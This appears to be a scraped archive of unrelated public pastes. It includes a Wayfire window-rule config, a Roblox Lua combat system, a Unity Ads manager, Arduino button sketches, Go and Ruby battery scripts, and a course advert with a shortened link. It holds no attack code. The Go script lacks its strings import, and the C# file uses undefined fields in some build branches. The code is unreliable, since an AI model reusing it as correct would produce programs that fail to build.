rule_040 = on created if app_id is ""pcmanfm"" then move 270 100
rule_042 = on created if app_id is ""pcmanfm"" then assign_workspace 2 2
rule_043 = on created if app_id is ""org.gnome.SystemMonitor"" then move 1350 730
rule_045 = on created if app_id is ""org.gnome.SystemMonitor"" then assign_workspace 0 1
rule_046 = on created if app_id is ""io.github.celluloid_player.Celluloid"" then move 1300 700
rule_048 = on created if app_id is ""io.github.celluloid_player.Celluloid"" then assign_workspace 2 2
rule_049 = on created if app_id is ""ulauncher"" then center
rule_050 = on created if app_id is ""ulauncher"" then set alpha 0.7
rule_051 = on created if app_id is ""blueman-manager"" then set geometry 1400 750 300 500
rule_052 = on created if app_id is ""blueman-manager"" then set alpha 0.7
rule_054 = on created if app_id is ""blueman-manager"" then assign_workspace 0 1
rule_055 = on created if app_id is ""io.github.fsobolev.Cavalier"" then assign_workspace 0 2
rule_056 = on created if app_id is ""evolution"" then set alpha 0.7
rule_057 = on created if app_id is ""evolution"" then assign_workspace 1 2
rule_058 = on created if app_id is ""catfish"" then move 270 100
rule_060 = on created if app_id is ""catfish"" then assign_workspace 0 2
rule_061 = on created if app_id is ""pavucontrol"" then set geometry 280 710 800 500
rule_062 = on created if app_id is ""pavucontrol"" then set alpha 0.9
rule_063 = on created if app_id is ""pavucontrol"" then assign_workspace 0 1
rule_064 = on created if app_id is ""org.gnome.Console"" then set alpha 0.8
rule_065 = on created if app_id is ""org.gnome.TextEditor"" then move 1160 80
rule_066 = on created if app_id is ""org.gnome.TextEditor"" then set alpha 0.8
rule_067 = on created if app_id is ""org.gnome.TextEditor"" then assign_workspace 2 0
rule_068 = on created if app_id is ""gimp-2.99"" then move 270 70
rule_069 = on created if app_id is ""gimp-2.99"" then set alpha 0.9
rule_070 = on created if app_id is ""gimp-2.99"" then assign_workspace 0 2
rule_072 = on created if app_id is ""Conky"" then set sticky
rule_073 = on created if app_id is ""com.github.rafostar.Clapper"" then set geometry 1350 720 750 500
rule_075 = on created if app_id is ""com.github.rafostar.Clapper"" then assign_workspace 2 2
rule_076 = on created if app_id is ""net.nokyan.Resources.Devel"" then set alpha 0.8
rule_077 = on created if app_id is ""net.nokyan.Resources.Devel"" then assign_workspace 1 1
rule_078 = on created if app_id is ""com.github.neithern.g4music"" then move 1400 600
rule_079 = on created if app_id is ""com.github.neithern.g4music"" then set alpha 0.7
rule_080 = on created if app_id is ""com.github.neithern.g4music"" then assign_workspace 0 2
rule_081 = on created if app_id is ""so.libdb.gtkcord4"" then set alpha 0.8
rule_082 = on created if app_id is ""so.libdb.gtkcord4"" then assign_workspace 1 1
rule_084 = on created if app_id is ""Brave-browser-beta"" then assign_workspace 1 0
rule_085 = on created if app_id is ""com.raggesilver.BlackBox"" then set alpha 0.8
rule_086 = on created if app_id is ""com.raggesilver.BlackBox"" then resize 880 500
rule_087 = on created if app_id is ""GStreamer gst-play-1.0"" then set geometry 1350 820 750 500
rule_088 = on created if app_id is ""terminator"" then set alpha 0.7
rule_089 = on created if app_id is ""terminator"" then set geometry 480 130 1700 1100
rule_090 = on created if app_id is ""terminator"" then assign_workspace 1 1
rule_091 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then set alpha 0.8
rule_092 = on created if app_id is ""org.gnome.Ptyxis.Devel"" then assign_workspace 1 1
rule_093 = on created if app_id is ""brave-browser-beta"" then move 270 70
rule_094 = on created if app_id is ""brave-browser-beta"" then set alpha 1.0
rule_095 = on created if app_id is ""brave-browser-beta"" then assign_workspace 1 0
rule_096 = on created if app_id is ""com.raggesilver.BlackBox"" then move 270 700
rule_097 = on created if app_id is ""com.raggesilver.BlackBox"" then assign_workspace 2 2
rule_098 = on created if app_id is ""vesktop"" then set alpha 0.8
rule_099 = on created if app_id is ""vesktop"" then assign_workspace 1 1
rule_100 = on created if app_id is ""org.wezfurlong.wezterm"" then set alpha 0.8
rule_101 = on created if app_id is ""org.wezfurlong.wezterm"" then assign_workspace 1 2
rule_102 = on created if app_id is ""nemo org.Nemo"" then set alpha 0.8
rule_103 = on created if app_id is ""nemo org.Nemo"" then assign_workspace 1 2
rule_104 = on created if app_id is ""ristretto"" then assign_workspace 2 1
rule_105 = on created if app_id is ""kitty"" then move 270 750
rule_106 = on created if app_id is ""kitty"" then set alpha 0.8
rule_107 = on created if app_id is ""kitty"" then assign_workspace 0 0
rule_108 = on created if app_id is ""Alacritty"" then move 1350 100
rule_109 = on created if app_id is ""Alacritty"" then set alpha 0.8
rule_110 = on created if app_id is ""Alacritty"" then assign_workspace 0 0
rule_111 = on created if app_id is ""mpv"" then move 1300 750
rule_112 = on created if app_id is ""mpv"" then assign_workspace 0 0
rule_113 = on created if app_id is ""lite-xl"" then move 1120 60
rule_114 = on created if app_id is ""lite-xl"" then set alpha 0.8
rule_115 = on created if app_id is ""lite-xl"" then assign_workspace 2 0
rule_116 = on created if app_id is ""nwg-look"" then move 270 100
rule_117 = on created if app_id is ""nwg-look"" then set alpha 0.8
rule_118 = on created if app_id is ""nwg-look"" then assign_workspace 0 1
rule_119 = on created if app_id is ""foot"" then set geometry 280 130 800 1100
rule_120 = on created if app_id is ""foot"" then set alpha 0.8
rule_121 = on created if app_id is ""foot"" then assign_workspace 0 2


[winzoom]
dec_x_binding = <ctrl> <super> KEY_LEFT
dec_y_binding = <ctrl> <super> KEY_UP
inc_x_binding = <ctrl> <super> KEY_RIGHT
inc_y_binding = <ctrl> <super> KEY_DOWN
modifier = <ctrl> <super> 
nearest_filtering = false
preserve_aspect = true
zoom_step = 0.100000

[wm-actions]
minimize = none
send_to_back = none
toggle_always_on_top = none
toggle_fullscreen = none
toggle_maximize = none
toggle_showdesktop = none
toggle_sticky = none

[wobbly]
friction = 3.000000
grid_resolution = 6
spring_k = 8.000000

[workarounds]
all_dialogs_modal = true
app_id_mode = full
discard_command_output = true
dynamic_repaint_delay = false
enable_input_method_v2 = false
enable_opaque_region_damage_optimizations = false
enable_so_unloading = false
force_preferred_decoration_mode = false
remove_output_limits = false
use_external_output_configuration = false

[workspace-names]
background_color = \#333333B3
background_radius = 30.000000
display_duration = 500
font = sans-serif
margin = 0
position = center
show_option_names = false
text_color = \#FFFFFFFF

[wrot]
activate = <ctrl> <super> BTN_RIGHT
activate-3d = <shift> <super> BTN_RIGHT
invert = false
reset = <ctrl> <super> KEY_R
reset-one = <super> KEY_R
reset_radius = 25.000000
sensitivity = 24

[wsets]
label_duration = 2000ms circle

[xdg-activation]

[zoom]
interpolation_method = 0
modifier = <super> 
smoothing_duration = 300ms circle
speed = 0.010000
"
uMVpmrQv,Code Example,extreime,Lua,Monday 6th of May 2024 02:36:22 PM CDT,"--//  Client // --

-- Services --
local replicatedStorage = game:GetService(""ReplicatedStorage"")
local userInputService = game:GetService(""UserInputService"")
local players = game:GetService(""Players"")

-- Modules --
local modules = replicatedStorage:WaitForChild(""Modules"")

local globalModules = require(modules.globalModules)
local clientModules = require(modules.clientModules)

local animationService = require(modules.animationService)

local hitboxService = require(globalModules.hitboxService)

 -- Some variables -- 
local player = players.LocalPlayer
local character = player.Character
local humanoid = character.Humanoid
local rootPart = character.HumanoidRootPart

local events = replicatedStorage:WaitForChild(""Communication"").Events
local functions = replicatedStorage:WaitForChild(""Communication"").Functions

local animations = animationService:LoadAnimations(character).animations

local combatEvent = events.combat
local cooldownEvent = events.cooldown

-- combat system variables --
local currentTrack = nil
local resetCooldown = 1
local comboDelay = 1.5
local attackCooldown = 0.45

local combo = 1
local maxCombo = 5
local canAttack = true
local canBlock = true

userInputService.InputBegan:Connect(function(input, typing)
	if typing then -- if the player is writing in the chat, the code will ignore his input
		return
	end
	
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		if not character:GetAttribute(""blocking"") and not character:GetAttribute(""comboCooldown"") then -- running the block of code if player isn't blocking or isn't on comboCooldown
			if canAttack then -- running the part of code that gives life to the combatSystem(if canAttack is true)
				canAttack = false
				canBlock = false
				
				character:SetAttribute(""running"", false) -- changing the running attribute to prevent player from running while attacking
				-- different attack types depending on player key and attribute state
				local airCombo = (userInputService:IsKeyDown(Enum.KeyCode.Space) and not character:GetAttribute(""aerialCombo"") and combo == 4) or false 
				local downSlam = (combo == 5 and character:GetAttribute(""aerialCombo""))
				-- getting the respective animationTrack relative to the attackType
				local track = airCombo and animations.launcher or downSlam and animations.downSlam
					or animations[tostring(combo)]
				
				if not track then
					warn(""track does not exist"")
						
					return -- exiting the function if the track doesn't exists
				end
				
				humanoid.JumpPower = 0 -- preventing player from jumping for better immersive combat
				
				task.delay(track.Length + 0.45, function()
					if currentTrack == track then
						humanoid.JumpPower = 50
					end
				end) -- enabling jumppower after short cooldown
				
 				-- stoping previus animation(if its looped)
				if currentTrack then
					if currentTrack.IsPlaying then
						currentTrack:Stop()
					end
				end
				
				local currentCombo = combo
				 -- playing the currentAnimation obtained previously in the track variable
				currentTrack = track
				currentTrack:Play()
				
				track:GetMarkerReachedSignal(""ConnectionPoint""):Once(function()-- using animationSignalMarker to run some hitbox and serverTrigger scripts
					local foundTargets = hitboxService:spatialQuery(character, track.Name == ""launcher"" and ""single"" or ""multi"")
					
					--print(currentCombo .. "":"",foundTargets)

					combatEvent:FireServer(""registerHit"", {foundTargets, currentCombo, airCombo})
				end)
				 -- reseting attack and block once the attack has ended
				track:GetMarkerReachedSignal(""AttackEnded""):Once(function()
					canAttack = true
					canBlock = true
				end)
				-- creating a server sided cooldown and creating a soundEffect
				cooldownEvent:FireServer({[""attacking""] = track.Length + 0.35, [""noJump""] = track.Length + 0.45})
				combatEvent:FireServer(""soundEffects"", {airCombo})
				
				-- creating the logic of the combat algorithm
				if combo >= 5 then
					
					canAttack = false
					-- reseting the combo once the combo has ended
					task.delay(comboDelay, function()
						combo = 1
						canAttack = true
						humanoid.JumpPower = 50
					end)
				else
					local old = combo
					--reseting the combo if the player takes too long to attack
					task.delay(resetCooldown, function()
						if combo == old + 1 then
							combo = 1
							
							canAttack = true
						end
					end)
				end
				
				combo += 1
			end
		end
	end
end)
-- another mechanism to reset the combo
combatEvent.OnClientEvent:Connect(function(request)
	if request == ""resetCombo"" then
		combo = 1
	end
end)

---------- // Server // ----

-- Services --
local replicatedStorage = game:GetService(""ReplicatedStorage"")
local players = game:GetService(""Players"")
-- Modules --
local modules = replicatedStorage:WaitForChild(""Modules"")

local globalModules = require(modules.globalModules)
local cooldownService = require(modules.cooldownService)

local hitboxService = require(globalModules.hitboxService)
 -- Events -- 
local Events = replicatedStorage:WaitForChild(""Communication"").Events
local Functions = replicatedStorage:WaitForChild(""Communication"").Functions

local combatEvent = Events.combat
local cooldownEvent = Events.cooldown

local information = require(modules.information)
 -- some combat Functions that affects the gameplay
local COMBAT_FUNCTIONS = {
	registerHit = function(player, combatInformations, foundTargets, currentCombo, airCombo)
		if not cooldownService:getActiveCooldowns(player, {""comboCooldown"", ""block""}) then -- running the code if ""comboCooldown"" and ""block"" isnt on cooldown
			if cooldownService:getActiveCooldowns(player, ""soundPlayed"") then -- creating a newSound cooldown if it doesnt exists
				cooldownService:setCooldown(player, ""soundPlayed"", false)
			end
			 -- changing combatInformations elements based on combo value/ creating a new cooldown when the combo is finished
			if currentCombo == 5 then
				combatInformations.knockback = true
				combatInformations.canBlockBreak = true
				
				cooldownService:setCooldown(player, ""comboCooldown""):extend(1.5)
			end
			-- changing the aerial element if aerial is true
			if airCombo then
				combatInformations.aerial = true
			end
			
			-- running hitboxService function to start the algoritm that checks if the damage is legal
			hitboxService:registerDamage(foundTargets, player, currentCombo, airCombo, combatInformations)
		end
	end,
	
	block = function(player, combatInformations, active) -- server side block functionabilities
		local character = player.Character
		local rootPart = character:FindFirstChild(""HumanoidRootPart"")
		local humanoid = character:FindFirstChild(""Humanoid"")
		
		if not rootPart or not humanoid then
			return
		end
		-- part of code that checks if the player has the attribute block as true and, if the player does, creates a intConstrained value that i personaly think that works good in this situation.
		if not character:GetAttribute(""block"") then
			if not cooldownService:getActiveCooldowns(player, {""block"", ""blockCooldown"",  ""stunned""}) then
				print(""Blocking"")
				
				local blockBarValue = Instance.new(""IntConstrainedValue"")
				blockBarValue.MaxValue = 5
				blockBarValue.Value = 5
				blockBarValue.Name = ""blockBar""
				blockBarValue.Parent = character
				-- creating a new cooldown called block. Toggle cooldown type
				cooldownService:setCooldown(character, ""block"")
			end
		else -- part of the code that runs if the player is currently blocking
			print(""stopped blocking"")
			
			local blockBarValue = character:FindFirstChild(""blockBarValue"")
			
			if blockBarValue then
				blockBarValue:Destroy()
			end
			 -- removing block cooldown, with a delay of 1 second
			cooldownService:setCooldown(character, {[""block""] = false, [""blockCooldown""] = 1})
		end
	end,
	
	soundEffects = function(player) -- creating sound effects with cooldown creating
		local character = player.Character
		
		if not cooldownService:getActiveCooldowns(player, {""comboCooldown"", ""soundPlayed"", ""block""}) then
			local swingSound = replicatedStorage.Sounds.Combat.swing:Clone()

			swingSound.Parent = character.HumanoidRootPart
			swingSound:Play()
			
			cooldownService:setCooldown(player, ""soundPlayed""):extend(0.5, false)
		end
	end,
}

combatEvent.OnServerEvent:Connect(function(player, actionName, arguments) -- listening and calling the function of the COMBAT_FUNCTIONS with the respective key
	local character = player.Character
	
	--print(""action: "" .. actionName)
	local combatInformations = information(""combat"")
	COMBAT_FUNCTIONS[actionName](player, combatInformations, unpack(arguments))
end)

-- creating a cooldown and reseting after length(in seconds) (similar to Debris, but with cooldowns)
cooldownEvent.OnServerEvent:Connect(function(player, arguments)
	for name, length in next, arguments do
		cooldownService:setCooldown(player, name):extend(length, false)
	end
end)
"
K6CNKn3k,Untitled,sissou123,HTML,Monday 6th of May 2024 02:14:43 PM CDT,"Modern HTML & CSS From The Beginning (Including Sass)
Build modern responsive websites & UIs with HTML5, CSS3 & Sass! Learn Flex & CSS Grid 
What you'll learn
Build Multiple High Quality Website & UI Projects
HTML5 Semantic Layout & CSS Fundamentals
Flexbox & CSS Grid Projects 
for more :https://cuty.io/FVRlSz19WZx
"
Y9TFj3Uy,Untitled,risge3000,C#,Monday 6th of May 2024 02:08:19 PM CDT,"using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Advertisements;
using UnityEngine.Diagnostics;

public class AdsManager : MonoBehaviour, IUnityAdsInitializationListener, IUnityAdsLoadListener, IUnityAdsShowListener {
    [SerializeField] string m_androidGameId;
    [SerializeField] string m_iOSGameId;
    [SerializeField] bool m_testMode = true;
    [SerializeField] BannerPosition m_bannerPosition = BannerPosition.TOP_CENTER;
    [SerializeField] float m_bannerDuration;
   
    private string m_gameId;
    string m_intersitialUnitsId;
    string m_bannerUnitsId;
    string m_rewardedUnitsId;

    float m_bannerTimer;
    bool m_canDisplayBanner;

    public static AdsManager instance;
    public delegate void AdEvents();
    public static AdEvents AdLoaded, AdEnded;
    adType typeOnHold = adType.None;

    private void Awake() {
        init();
    }

    private void Update() {
        updateTimer();
    }

    /// <summary>
    /// inicalizaciones requeridas por el manager
    /// </summary>
    private void init() {
        //referencia singleton 
        if (instance != null) {
            Destroy(this);
            return;
        }
        instance = this;

        //asignar valores de las Ids dependiendo del sistema operativo
#if UNITY_IOS
        m_gameId = _iOSGameId;
        m_intersitialId = ""Interstitial_iOS"";
        m_bannerId = ""Banner_iOS"";
        m_rewardedUnitsId = ""Rewarded_iOS"";

#elif UNITY_ANDROID
        m_gameId = m_androidGameId;
        m_intersitialUnitsId = ""Interstitial_Android"";
        m_bannerUnitsId = ""Banner_android"";
        m_rewardedUnitsId = ""Rewarded_Android"";

#elif UNITY_EDITOR
        m_gameId = _androidGameId; //Only for testing the functionality in the Editor
        m_intersitialId = ""Interstitial_Android"";
        m_bannerId = ""Banner_Android"";
        m_rewardedUnitsId = ""Rewarded_Android"";

#endif
        //inicializar el servicio de ads
        if (!Advertisement.isInitialized && Advertisement.isSupported) {
            Advertisement.Initialize(m_gameId, m_testMode, this);
        }

        //suscribirse a su propio evento de OnLoadedAd
        AdLoaded += onLoadedAd;

        //configurar la posición del banner e inicializarlo
        Advertisement.Banner.SetPosition(m_bannerPosition);
        loadAndShowAd(adType.Banner);
    }

    /// <summary>
    /// Actualiza el timer del banner y carga otro nuevo de ser necesario
    /// </summary>
    void updateTimer() {
        if (m_bannerTimer > 0 && m_canDisplayBanner)
            m_bannerTimer -= Time.deltaTime;
        else if (m_canDisplayBanner) {
            Advertisement.Banner.Hide();
            Debug.Log(""LoadingNewAd"");
            loadBanner();
        }
    }

    /// <summary>
    /// cosas para hacer de a cuerdo a la ad cargada
    /// </summary>
    void onLoadedAd() {

        switch (typeOnHold) {
            case adType.Intersitial:
                showIntersitialAd();
                break;

            case adType.Rewarded:
                Debug.Log(""Show rewarded ad"");
                showRewardedAd();
                break;

            case adType.IntersitialRewarded:

                break;

            default:
                Debug.LogError($""Non Valid ad type!!!"");
                break;
        }
        typeOnHold = adType.None;
    }



    #region Intersitial
    /// <summary>
    /// Carga en memoria la nueva ad de tipo intersicial
    /// </summary>
    void loadIntersitialAd() {
        // IMPORTANT! Only load content AFTER initialization (in this example, initialization is handled in a different script).
        Debug.Log(""Loading Ad: "" + m_intersitialUnitsId);
        Advertisement.Load(m_intersitialUnitsId, this);
    }

    /// <summary>
    /// muestra la ad de tipo intersicial
    /// </summary>
    void showIntersitialAd() {
        Advertisement.Show(m_intersitialUnitsId, this);
    }
    #endregion

    #region Rewarded
    /// <summary>
    /// Carga en memoria la nueva ad de tipo Rewarded
    /// </summary>
    void loadRewardedAd() {
        Debug.Log(""Load rewarded ad"");
        Advertisement.Load(m_rewardedUnitsId, this);
    }

    /// <summary>
    /// muestra la ad de tipo Rewarded
    /// </summary>
    void showRewardedAd() {
        Advertisement.Show(m_rewardedUnitsId, this);
    }
    #endregion

    #region IntersitialRewarded
    #endregion


    #region Banner
    /// <summary>
    /// carga el nuevo banner en memoria
    /// </summary>
    void loadBanner() {
        // Set up options to notify the SDK of load events:
        BannerLoadOptions options = new BannerLoadOptions {
            loadCallback = onBannerLoaded,
            errorCallback = onBannerError
        };

        // Load the Ad Unit with banner content:
        Advertisement.Banner.Load(m_bannerUnitsId, options);

        //Muestra el banner tras haberse cargado completamente
        void onBannerLoaded() {
            Debug.Log(""Banner loaded"");
            m_bannerTimer = m_bannerDuration;
            showBannerAd();
        }

        // Implement code to execute when the load errorCallback event triggers:
        void onBannerError(string message) {
        }
    }

    /// <summary>
    /// Muestra el banner precargado
    /// </summary>
    void showBannerAd() {
        // Set up options to notify the SDK of show events:
        BannerOptions options = new BannerOptions {
            clickCallback = onBannerClicked,
            hideCallback = onBannerHidden,
            showCallback = onBannerShown
        };

        // Show the loaded Banner Ad Unit:
        Advertisement.Banner.Show(m_bannerUnitsId, options);

        void onBannerClicked() { }
        void onBannerShown() { }
        void onBannerHidden() { }
    }

    /// <summary>
    /// Forxa el AdsManager a ocultar el banner actual
    /// </summary>
    public void forceHideBannerAd() {
        // Hide the banner:
        Advertisement.Banner.Hide();
        m_bannerTimer = 0;
        m_canDisplayBanner = false;
    }
    #endregion

    #region AdsInterfaces
    //NOTA: NO RENOMBRAR A LA NOMENCLATURA DEL ESTUDIO. Son funciones requeridas por la API de Unity al heredar de las clases de ads, por más que poco o nada las usemos
    public void OnUnityAdsAdLoaded(string adUnitId) {
        if(adUnitId != m_bannerUnitsId) {
            AdLoaded?.Invoke();
        }
    }

    public void OnUnityAdsFailedToLoad(string _adUnitId, UnityAdsLoadError error, string message) {
        // Optionally execute code if the Ad Unit fails to load, such as attempting to try again.
    }

    public void OnUnityAdsShowFailure(string _adUnitId, UnityAdsShowError error, string message) {
        // Optionally execute code if the Ad Unit fails to show, such as loading another ad.
    }

    public void OnUnityAdsShowStart(string _adUnitId) { }
    public void OnUnityAdsShowClick(string _adUnitId) { }
    public void OnUnityAdsShowComplete(string _adUnitId, UnityAdsShowCompletionState showCompletionState) {   
        AdEnded?.Invoke();
        if (_adUnitId.Equals(m_rewardedUnitsId) && showCompletionState.Equals(UnityAdsShowCompletionState.COMPLETED)) {
            Debug.Log(""Unity Ads Rewarded Ad Completed"");
            //CARPI Aquí va lo de las rewards
        }

    }

    public void OnInitializationComplete() {
        Debug.Log(""Unity Ads initialization complete."");
    }

    public void OnInitializationFailed(UnityAdsInitializationError error, string message) {
       
    }
    #endregion

    #region Shortcuts
    /// <summary>
    /// Función que automatiza el cargado y mostrado de los tipos de publicidad
    /// </summary>
    /// <param name=""type""></param>
    void loadAndShowAd(adType type) {
        switch (type) {
            case adType.Intersitial:
                typeOnHold = adType.Intersitial;
                loadIntersitialAd();
                break;

            case adType.Rewarded:
                typeOnHold = adType.Rewarded;
                loadRewardedAd();
                break;

            case adType.IntersitialRewarded:
                /*typeOnHold = adType.IntersitialRewarded;
                loadIntersitialRewarded();*/
                break;
            case adType.Banner:
                m_canDisplayBanner = true;
                loadBanner();
                break;

            default:
                Debug.LogError($""Non Valid ad type!!!"");
                break;


        }
    }

    /// <summary>
    /// Carga y muestra una ad del tipo intersitial
    /// </summary>
    public void loadAndShowIntersitialAd() {
        loadAndShowAd(adType.Intersitial);
    }

    /// <summary>
    /// Carga y muestra una ad del tipo rewarded
    /// </summary>
    public void loadAndShowRewarded() {
        loadAndShowAd(adType.Rewarded);
    }

    /// <summary>
    /// [DESHABILITADA] Carga y muestra una ad Intersitial con reward.
    /// </summary>
    public void loadandshowIntersitialRewarded() {
        loadAndShowAd(adType.IntersitialRewarded);

    }

    /// <summary>
    /// carga y muestra un banner
    /// </summary>
    public void loadandShowBanner() {
        loadAndShowAd(adType.Banner);
    }

   
    #endregion

    /// <summary>
    /// Tipos de Ad
    /// </summary>
    [Serializable]
    public enum adType {
        None,
        Intersitial,
        Rewarded,
        IntersitialRewarded,
        Banner
    }
   
}
"
RybZGhQp,EasyButton Library rev_02,pleasedontcode,Arduino,Monday 6th of May 2024 01:54:19 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: EasyButton Library
	- Source Code compiled for: Arduino Uno
	- Source Code created on: 2024-05-06 18:53:23

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* volume controller for Windows with 3 buttons */
	/* (previous track, start/pause track, next track) */
	/* and 4 potenciometers (master volume, volume of */
	/* opera.exe) */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t BUTTON_ONE_PIN = 2;
const uint8_t BUTTON_TWO_PIN = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button1(BUTTON_ONE_PIN);
EasyButton button2(BUTTON_TWO_PIN);

void onButton1Pressed() {
  Serial.println(""Button1 pressed"");
}

void onButton2Pressed() {
  Serial.println(""Button2 pressed"");
}

void setup(void)
{
  // put your setup code here, to run once:
  pinMode(BUTTON_ONE_PIN, INPUT_PULLUP);
  pinMode(BUTTON_TWO_PIN, INPUT_PULLUP);

  Serial.begin(115200);
  Serial.println();
  Serial.println("">>> EasyButton multiple buttons example <<<"");

  button1.begin();
  button2.begin();
  button1.onPressed(onButton1Pressed);
  button2.onPressed(onButton2Pressed);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  button1.read();
  button2.read();
}
"
fGiXAPRU,Button Handler rev_01,pleasedontcode,Arduino,Monday 6th of May 2024 01:53:00 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: Button Handler
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2024-05-06 18:52:18

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* volume controller for Windows with 3 buttons */
	/* (previous track, start/pause track, next track) */
	/* and 4 potenciometers (master volume, volume of */
	/* opera.exe, volume of discord.exe and other apps) */
/****** SYSTEM REQUIREMENT 2 *****/
	/* volume controller for Windows with 3 buttons */
	/* (previous track, start/pause track, next track) */
	/* and 4 potenciometers (master volume, volume of */
	/* opera.exe) */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <EasyButton.h>	//https://github.com/evert-arias/EasyButton

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t BUTTON_ONE_PIN = 2;
const uint8_t BUTTON_TWO_PIN = 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
EasyButton button1(BUTTON_ONE_PIN);
EasyButton button2(BUTTON_TWO_PIN);

void onButton1Pressed() {
  Serial.println(""Button1 pressed"");
}

void onButton2Pressed() {
  Serial.println(""Button2 pressed"");
}

void setup(void)
{
  // put your setup code here, to run once:
  pinMode(BUTTON_ONE_PIN, INPUT_PULLUP);
  pinMode(BUTTON_TWO_PIN, INPUT_PULLUP);

  Serial.begin(115200);
  Serial.println();
  Serial.println("">>> EasyButton multiple buttons example <<<"");

  button1.begin();
  button2.begin();
  button1.onPressed(onButton1Pressed);
  button2.onPressed(onButton2Pressed);
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  button1.read();
  button2.read();
}
"
F6sBE1R8,batstats.go,Python253,Go,Monday 6th of May 2024 01:52:58 PM CDT,"package main

import ""fmt""

// Filename: batstats.go
// Version: 1.0.0
// Author: Jeoi Reqi
// Tested on [GO v1.22] @ URL: https://go.dev/play/

// This script retrieves battery information.
// It presents battery details like status and charge level clearly.
// Users can quickly gauge battery health and make informed decisions about power usage.

// Requirements:
//   - No external dependencies required.

// Usage:
//   - Navigate to the directory containing this script in the terminal.
//   - Run the script using the following command:
//       './batstats'

// Example Output:
//    --------------------------------------------------
//            :: BATTERY STATS ::
//    --------------------------------------------------
//
//    Internal Battery: [AP18E8M]    Status: OK
//    Battery Status:                Connected to AC (2)
//    Charge Remaining:              95%
//
//    --------------------------------------------------

func main() {
    // Battery information
    battery := map[string]interface{}{
        ""Caption"":                 ""Internal Battery"",
        ""Name"":                    ""AP18E8M"",
        ""Status"":                  ""OK"",
        ""BatteryStatus"":           2,
        ""EstimatedChargeRemaining"": 95,
    }

    // Dictionary to map battery status codes to their descriptions
    batteryStatus := map[int]string{
        1:  ""Discharging"",
        2:  ""Connected to AC"",
        3:  ""Fully charged"",
        4:  ""Low"",
        5:  ""Critical"",
        6:  ""Charging"",
        7:  ""Charging/High"",
        8:  ""Charging/Low"",
        9:  ""Charging/Critical"",
        10: ""Undefined"",
        11: ""Partially Charged"",
    }

    // Get battery status description based on the status code
    batteryStatusDescription := batteryStatus[battery[""BatteryStatus""].(int)]

    // Print battery information header
    fmt.Println(strings.Repeat(""-"", 50))
    fmt.Println(""\t\t:: BATTERY STATS ::"")
    fmt.Println(strings.Repeat(""-"", 50))

    // Print battery information
    fmt.Printf(""\n%s: [%s]\tStatus: %s\n"", battery[""Caption""], battery[""Name""], battery[""Status""])
    fmt.Printf(""Battery Status:                %s (%d)\n"", batteryStatusDescription, battery[""BatteryStatus""])
    fmt.Printf(""Charge Remaining:              %d%%\n"", battery[""EstimatedChargeRemaining""])
    fmt.Println(strings.Repeat(""-"", 50))
}
"
gDpNcig0,batstats.rb,Python253,Ruby,Monday 6th of May 2024 01:43:23 PM CDT,"#!/usr/bin/env ruby
# Filename: batstats.rb
# Version: 1.0.0
# Author: Jeoi Reqi

# This script retrieves battery information using a system-specific module.
# It's designed for Windows, requiring a specific module for battery information retrieval.
# The script presents battery details like status and charge level clearly.
# Users can quickly gauge battery health and make informed decisions about power usage.

# Requirements:
#   - Ruby
#   - Windows-specific module for battery information retrieval

# Usage:
#   - Before running the script, ensure you have Ruby installed on your system.
#   - Ensure the system-specific module for battery information retrieval is available.
#   - Navigate to the directory containing this script in the terminal.
#   - Run the script using the following command:
#         'ruby batstats.rb'

# Example Output:
#   --------------------------------------------------
#           :: BATTERY STATS ::
#   --------------------------------------------------
#
#   Internal Battery: [AP18E8M]    Status: OK
#   Battery Status:                Connected to AC (2)
#   Charge Remaining:              95%
#
#   --------------------------------------------------

# Placeholder for battery information retrieval
class BatteryInfo
  # Dummy method to retrieve battery information
  def self.get_battery_info
    {
      Caption: 'Internal Battery',
      Name: 'AP18E8M',
      Status: 'OK',
      BatteryStatus: 2,
      EstimatedChargeRemaining: 95
    }
  end
end

# Dictionary to map battery status codes to their descriptions
BATTERY_STATUS = {
  1 => 'Discharging',
  2 => 'Connected to AC',
  3 => 'Fully charged',
  4 => 'Low',
  5 => 'Critical',
  6 => 'Charging',
  7 => 'Charging/High',
  8 => 'Charging/Low',
  9 => 'Charging/Critical',
  10 => 'Undefined',
  11 => 'Partially Charged'
}.freeze

# Get battery information
battery = BatteryInfo.get_battery_info

# Get battery status description based on the status code
battery_status_description = BATTERY_STATUS[battery[:BatteryStatus]] || 'Unknown'

# Print battery information header
puts '-' * 50
puts ""\t\t:: BATTERY STATS ::""
puts '-' * 50

# Print battery information
puts ""\n#{battery[:Caption]}: [#{battery[:Name]}]    Status: #{battery[:Status]}""
puts ""Battery Status:                #{battery_status_description} (#{battery[:BatteryStatus]})""
